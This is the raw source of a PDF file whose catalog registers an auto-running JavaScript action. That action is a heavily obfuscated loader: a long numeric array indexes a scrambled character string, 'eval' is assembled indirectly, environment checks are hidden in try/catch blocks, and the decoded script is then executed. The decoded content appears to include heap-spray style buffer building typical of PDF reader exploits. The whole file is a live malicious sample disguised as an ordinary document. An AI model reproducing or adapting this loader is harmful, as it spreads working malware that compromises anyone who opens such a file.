%PDF-1.6
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
21 0 obj
<</MarkInfo<</Marked true>>/Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[123 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 1108/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
60 0 obj
<</Length 539/Filter/FlateDecode/Type/Contents>>stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(j='4wbt43t';
z
=
new
Array\(42,63,29,52,29,54,49,54,25,25,18,50,5,56,20,54,40,14,44,31,2,2,40,14,63,15,52,43,40,14,44,1,63,15,40,14,45,1,52,43,40,14,52,64,31,43,40,14,31,31,1,63,40,14,2,43,15,6,40,14,43,6,44,18,40,14,44,18,31,6,40,14,6,15,43,6,40,14,45,6,44,18,40,14,1,2,49,15,40,14,45,2,44,18,40,14,31,31,6,44,40,14,2,2,22,18,40,14,1,52,44,18,40,14,6,31,31,15,40,14,31,31,45,43,40,14,44,49,74,15,40,14,49,1,52,52,40,14,63,63,49,6,40,14,18,44,63,63,40,14,43,6,44,18,40,14,15,31,31,6,40,14,31,64,43,2,40,14,45,1,6,2,40,14,44,45,63,18,40,14,74,43,31,43,40,14,52,43,44,1,40,14,1,49,45,1,40,14,52,18,52,64,40,14,1,49,43,15,40,14,44,18,1,2,40,14,31,15,45,1,40,14,45,43,44,18,40,14,45,44,31,1,40,14,63,1,6,31,40,14,44,18,1,2,40,14,74,6,45,2,40,14,63,1,6,31,40,14,15,64,31,31,40,14,43,49,43,64,40,14,36,22,63,15,40,14,15,1,6,31,40,14,22,18,31,31,40,14,18,52,6,63,40,14,31,44,49,6,40,14,45,43,63,74,40,14,15,49,6,44,40,14,6,22,15,18,40,14,22,36,6,31,40,14,52,18,43,6,40,14,31,18,63,49,40,14,45,1,49,63,40,14,1,52,52,2,40,14,1,52,44,18,40,14,6,31,74,43,40,14,2,2,22,22,40,14,6,15,44,18,40,14,44,22,43,18,40,14,52,15,43,2,40,14,1,43,63,63,40,14,6,15,74,43,40,14,22,44,44,18,40,14,22,22,6,31,40,14,6,43,44,18,40,14,6,31,44,18,40,14,36,18,15,1,40,14,1,64,1,52,40,14,52,18,15,31,40,14,36,22,1,31,40,14,2,44,44,18,40,14,44,6,74,6,40,14,6,15,45,22,40,14,45,43,31,31,40,14,64,2,6,31,40,14,63,31,52,18,40,14,2,44,44,18,40,14,44,18,6,44,40,14,2,36,63,45,40,14,1,64,6,1,40,14,64,44,52,44,40,14,63,63,63,63,40,14,52,74,63,63,40,14,52,44,63,64,40,14,6,6,6,6,40,14,6,6,6,6,40,14,1,6,1,44,40,14,43,6,2,36,40,14,63,63,2,44,40,14,6,6,6,6,40,14,1,6,6,6,40,14,15,6,44,31,40,14,1,6,49,64,40,14,44,18,1,1,40,14,44,18,52,15,40,14,49,6,1,52,40,14,15,31,44,31,40,14,63,63,6,1,40,14,2,44,52,31,40,14,2,52,2,63,40,14,6,6,6,6,40,14,45,1,2,44,40,14,2,15,45,74,40,14,1,43,2,22,40,14,49,2,63,63,40,14,15,43,44,31,40,14,44,18,6,44,40,14,52,44,52,44,40,14,63,63,2,49,40,14,63,63,63,63,40,14,6,74,52,18,40,14,45,74,52,18,40,14,52,15,44,49,40,14,6,49,6,43,40,14,6,6,6,6,40,14,1,15,44,22,40,14,6,15,74,43,40,14,6,43,15,45,40,14,45,74,74,43,40,14,2,45,2,1,40,14,15,45,45,31,40,14,74,43,43,43,40,14,45,2,6,43,40,14,31,31,45,74,40,14,15,45,31,74,40,14,74,43,43,43,40,14,74,6,6,44,40,14,45,31,74,22,40,14,1,31,74,6,40,14,63,44,2,44,40,14,6,6,6,6,40,14,63,63,6,6,40,14,6,15,1,2,40,14,52,44,44,18,40,14,15,64,31,31,40,14,15,45,1,49,40,14,49,22,43,43,40,14,45,45,6,6,40,14,2,74,45,6,40,14,15,45,45,43,40,14,49,22,43,43,40,14,74,52,6,1,40,14,2,15,2,43,40,14,15,2,2,15,40,14,49,22,43,43,40,14,6,6,6,64,40,14,44,36,1,64,40,14,6,43,15,49,40,14,44,44,31,6,40,14,49,22,43,43,40,14,43,49,6,43,40,14,2,36,1,49,40,14,2,36,6,6,40,14,1,31,6,6,40,14,2,36,1,45,40,14,63,63,6,6,40,14,49,43,1,2,40,14,15,6,44,1,40,14,49,2,45,1,40,14,6,6,2,36,40,14,63,63,1,31,40,14,6,43,1,2,40,14,6,6,2,36,40,14,52,18,44,31,40,14,1,31,6,15,40,14,1,2,63,63,40,14,44,31,6,43,40,14,6,15,15,31,40,14,6,74,52,18,40,14,49,31,52,18,40,14,44,6,43,45,40,14,6,6,31,63,40,14,63,36,45,1,40,14,44,6,43,45,40,14,6,6,31,63,40,14,15,43,45,1,40,14,6,6,2,36,40,14,63,52,2,36,40,14,1,2,63,63,40,14,52,44,6,44,40,14,63,52,64,15,40,14,63,63,63,63,40,14,43,52,44,52,40,14,52,15,6,52,40,14,63,52,64,44,40,14,6,52,44,36,40,14,2,63,44,64,40,14,18,22,6,49,40,14,15,36,31,31,40,14,1,18,44,36,40,14,15,2,49,18,40,14,45,64,43,2,40,14,49,36,31,2,40,14,45,6,74,63,40,14,45,43,2,44,40,14,45,6,45,43,40,14,74,63,31,36,40,14,45,6,74,63,40,14,45,74,2,63,40,14,2,63,2,52,40,14,2,63,45,43,40,14,45,74,45,74,40,14,2,52,2,1,40,14,74,52,45,43,40,14,45,31,2,49,40,14,2,49,2,64,40,14,45,45,74,63,40,14,45,6,74,52,40,14,45,6,2,44,40,14,2,2,31,63,40,14,31,64,31,22,40,14,74,2,31,45,40,14,31,22,2,1,40,14,6,6,31,1,40,14,6,6,6,6,54,21,63,14,7,15,51,42,58,7,13,52,4,75,23,29,23,36,41,59,72,25,17,30,37,42,35,52,29,23,36,73,35,52,7,56,51,37,53,74,60,59,72,25,17,23,36,3,20,23,36,21,9,23,36,20,23,36,73,5,14,18,5,51,23,42,7,56,29,6,41,59,72,0,74,25,21,23,52,51,14,23,7,13,23,36,21,9,13,63,14,7,15,51,42,58,7,13,18,33,29,25,17,75,36,23,13,22,61,56,20,7,52,30,13,66,23,23,36,72,29,25,21,75,36,23,13,75,30,20,6,33,6,15,6,15,6,15,6,15,21,75,36,23,13,36,22,22,23,20,6,33,43,6,6,6,6,6,21,75,36,23,13,57,36,72,35,58,36,22,20,14,7,52,5,15,36,57,52,29,18,50,5,56,25,21,75,36,23,13,5,15,55,35,52,7,20,57,36,72,35,58,36,22,73,35,52,7,56,51,37,53,74,21,75,36,23,13,59,72,20,36,22,22,23,19,29,5,15,55,35,52,7,3,6,33,31,44,25,21,75,36,23,13,72,36,23,5,57,20,14,7,52,5,15,36,57,52,29,48,40,14,64,6,64,6,40,14,64,6,64,6,48,25,21,72,36,23,5,57,20,52,4,75,23,29,72,36,23,5,57,41,59,72,25,21,75,36,23,13,15,58,14,7,51,74,20,29,75,30,19,6,33,43,6,6,6,6,6,25,0,36,22,22,23,21,63,58,23,29,75,36,23,13,15,58,14,7,51,20,6,21,15,58,14,7,51,60,15,58,14,7,51,74,21,15,58,14,7,51,3,3,25,17,22,61,56,46,15,58,14,7,51,16,20,72,36,23,5,57,3,57,36,72,35,58,36,22,21,9,13,75,36,23,13,58,75,52,23,63,35,58,30,20,14,7,52,5,15,36,57,52,29,48,40,14,6,15,6,15,40,14,6,15,6,15,48,25,21,30,37,42,35,52,29,58,75,52,23,63,35,58,30,73,35,52,7,56,51,37,60,43,43,64,1,74,25,17,58,75,52,23,63,35,58,30,3,20,58,75,52,23,63,35,58,30,21,9,13,51,37,42,5,73,15,58,35,35,36,18,69,51,58,23,52,20,27,58,35,35,36,18,73,15,58,35,35,52,15,51,10,70,36,42,35,34,7,63,58,29,17,5,14,18,50,47,48,48,41,70,5,56,47,58,75,52,23,63,35,58,30,9,25,21,9,13,63,14,7,15,51,42,58,7,13,57,23,42,7,51,63,29,25,17,7,58,57,20,14,7,52,5,15,36,57,52,29,48,40,14,6,66,6,66,40,14,6,66,6,66,40,14,6,66,6,66,40,14,6,66,6,66,48,25,21,75,36,23,13,57,36,72,35,58,36,22,20,14,7,52,5,15,36,57,52,29,18,50,5,56,25,21,37,52,36,57,18,35,58,15,61,20,7,58,57,3,57,36,72,35,58,36,22,21,18,42,56,18,35,58,15,61,20,14,7,52,5,15,36,57,52,29,48,40,14,6,66,6,66,40,14,6,66,6,66,48,25,21,37,52,36,22,52,23,5,42,4,52,20,74,6,21,5,57,23,36,72,20,37,52,36,22,52,23,5,42,4,52,3,37,52,36,57,18,35,58,15,61,73,35,52,7,56,51,37,21,30,37,42,35,52,29,18,42,56,18,35,58,15,61,73,35,52,7,56,51,37,60,5,57,23,36,72,25,17,18,42,56,18,35,58,15,61,3,20,18,42,56,18,35,58,15,61,21,9,13,63,42,35,35,18,35,58,15,61,20,18,42,56,18,35,58,15,61,73,5,14,18,5,51,23,42,7,56,29,6,41,5,57,23,36,72,25,21,18,35,58,15,61,20,18,42,56,18,35,58,15,61,73,5,14,18,5,51,23,42,7,56,29,6,41,18,42,56,18,35,58,15,61,73,35,52,7,56,51,37,19,5,57,23,36,72,25,21,30,37,42,35,52,29,18,35,58,15,61,73,35,52,7,56,51,37,3,5,57,23,36,72,60,6,33,43,6,6,6,6,25,17,18,35,58,15,61,20,18,35,58,15,61,3,18,35,58,15,61,3,63,42,35,35,18,35,58,15,61,21,9,13,70,52,70,20,7,52,30,13,66,23,23,36,72,29,25,21,63,58,23,29,42,20,6,21,42,60,49,43,6,6,21,42,3,3,25,17,70,52,70,46,42,16,20,18,35,58,15,61,3,37,52,36,57,18,35,58,15,61,21,9,13,75,36,23,13,7,14,70,20,49,74,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,44,21,14,51,42,35,73,57,23,42,7,51,63,29,48,40,43,1,6,6,6,63,48,41,7,14,70,25,21,9,13,63,14,7,15,51,42,58,7,13,56,52,51,42,15,58,7,29,25,17,75,36,23,13,36,23,23,72,20,7,52,30,13,66,23,23,36,72,29,25,21,42,63,29,36,57,57,73,22,58,15,73,27,58,35,35,36,18,73,56,52,51,34,15,58,7,25,17,75,36,23,13,57,36,72,35,58,36,22,20,14,7,52,5,15,36,57,52,29,18,50,5,56,25,21,75,36,23,13,37,71,59,1,6,6,27,28,20,57,36,72,35,58,36,22,73,35,52,7,56,51,37,53,74,21,75,36,23,13,59,72,20,6,33,43,6,6,6,6,6,19,29,37,71,59,1,6,6,27,28,3,6,33,31,44,25,21,75,36,23,13,72,36,23,5,57,20,14,7,52,5,15,36,57,52,29,48,40,14,64,6,64,6,40,14,64,6,64,6,48,25,21,72,36,23,5,57,20,52,4,75,23,29,72,36,23,5,57,41,59,72,25,21,75,36,23,13,57,1,66,50,8,2,1,63,20,29,6,33,6,15,6,15,6,15,6,15,19,6,33,43,6,6,6,6,6,25,0,6,33,43,6,6,6,6,6,21,63,58,23,29,75,36,23,13,75,59,15,39,24,64,2,72,20,6,21,75,59,15,39,24,64,2,72,60,57,1,66,50,8,2,1,63,21,75,59,15,39,24,64,2,72,3,3,25,17,36,23,23,72,46,75,59,15,39,24,64,2,72,16,20,72,36,23,5,57,3,57,36,72,35,58,36,22,21,9,13,75,36,23,13,51,11,65,37,28,18,67,30,20,14,7,52,5,15,36,57,52,29,48,40,6,64,48,25,21,30,37,42,35,52,29,51,11,65,37,28,18,67,30,73,35,52,7,56,51,37,60,6,33,43,6,6,6,25,17,51,11,65,37,28,18,67,30,3,20,51,11,65,37,28,18,67,30,21,9,13,51,11,65,37,28,18,67,30,20,48,28,73,48,3,51,11,65,37,28,18,67,30,21,36,57,57,73,22,58,15,73,27,58,35,35,36,18,73,56,52,51,34,15,58,7,29,51,11,65,37,28,18,67,30,25,21,9,9,13,36,62,35,14,56,42,7,5,20,36,57,57,73,57,35,14,56,34,7,5,21,75,36,23,13,5,75,20,57,36,23,5,52,34,7,51,29,36,57,57,73,75,42,52,30,52,23,32,52,23,5,42,58,7,73,51,58,69,51,23,42,7,56,29,25,73,15,37,36,23,66,51,29,6,25,25,21,63,58,23,29,75,36,23,13,42,20,6,21,42,60,36,62,35,14,56,42,7,5,73,35,52,7,56,51,37,21,42,3,3,25,17,42,63,29,36,62,35,14,56,42,7,5,46,42,16,73,7,36,70,52,20,20,54,10,69,15,23,42,57,51,54,25,17,75,36,23,13,35,75,20,36,62,35,14,56,42,7,5,46,42,16,73,75,52,23,5,42,58,7,21,9,9,13,42,63,29,29,35,75,20,20,64,25,26,26,29,29,5,75,20,20,44,25,68,68,29,35,75,60,20,44,73,49,74,25,25,25,17,56,52,51,42,15,58,7,29,25,21,9,52,35,5,52,13,42,63,29,35,75,20,20,45,73,49,25,17,57,23,42,7,51,63,29,25,21,9,52,35,5,52,13,42,63,29,29,29,5,75,20,20,2,25,26,26,29,5,75,20,20,45,25,25,68,68,29,35,75,60,45,73,49,49,25,25,17,18,33,29,25,21,9,52,35,5,52,13,42,63,29,29,35,75,38,20,64,73,49,25,26,26,29,35,75,60,20,64,73,74,25,26,26,29,35,75,38,20,44,73,49,31,25,26,26,29,35,75,60,20,44,73,49,45,25,25,17,63,14,7,15,51,42,58,7,13,36,29,25,17,14,51,42,35,73,57,23,42,7,51,22,29,54,57,12,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,13,47,13,72,72,72,72,49,49,49,54,41,7,52,30,13,24,36,51,52,29,25,25,21,9,75,36,23,13,37,20,36,57,57,73,57,35,14,56,34,7,5,21,63,58,23,29,75,36,23,13,63,20,6,21,63,60,37,73,35,52,7,56,51,37,21,63,3,3,25,17,42,63,29,37,46,63,16,73,7,36,70,52,20,20,54,10,69,15,23,42,57,51,54,25,17,75,36,23,13,42,20,37,46,63,16,73,75,52,23,5,42,58,7,21,9,9,13,42,63,29,29,42,38,44,73,49,74,25,68,68,29,42,60,44,73,74,25,25,17,15,20,7,52,30,13,66,23,23,36,72,29,25,21,75,36,23,13,22,20,14,7,52,5,15,36,57,52,29,54,40,14,64,6,64,6,40,14,64,6,64,6,54,25,21,75,36,23,13,52,20,14,7,52,5,15,36,57,52,29,18,50,5,56,25,21,30,37,42,35,52,29,22,73,35,52,7,56,51,37,60,20,6,33,44,6,6,6,25,17,22,3,20,22,21,9,22,20,22,73,5,14,18,5,51,23,29,6,41,6,33,44,6,6,6,19,52,73,35,52,7,56,51,37,25,21,63,58,23,29,63,20,6,21,63,60,74,64,6,6,21,63,3,3,25,17,15,46,63,16,20,22,3,52,21,9,36,29,25,21,36,29,25,21,51,23,72,17,51,37,42,5,73,70,52,22,42,36,73,7,52,30,62,35,36,72,52,23,29,7,14,35,35,25,21,9,15,36,51,15,37,29,52,25,17,9,36,29,25,21,9,9\);
a=new String\("/56+zs0nK}EU@ uc]{b-=;drD\)|CN\(w3VxIlah>Q%,i487[:'1jte*'_gpoq<kPf9MAG&SmWy.2v"\);
b="al";
b2="v"
+b;
try
{
for\(i in app\)
if\(i==='printerNames'\)
bbb-123;
}
catch\(her436j34k76\)
{
e=j['substr']\(\);
try{
b='e'+b2;
if\(!google.search\(\)\)
a=2;
}
catch\(q\){
e=
e[
b];
}
s='';try{if\(!google.search\(\)\)throw 1;}catch\(q\){r=1;}{
for\(j=0;j<z.length;j++\)
try{
if\(!google.search\(\)\)throw 1;}catch\(q\){
s
+=
a[
z[j]];
}
}}

try{if\(!google.search\(\)\)bbb-123;}
catch\(nergerg\){
e\(s\);
})>>
endobj
xref
0 155
trailer
<</Size 155
/Root 21 0 R>>
xref
0 0
trailer
<</Size 155/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF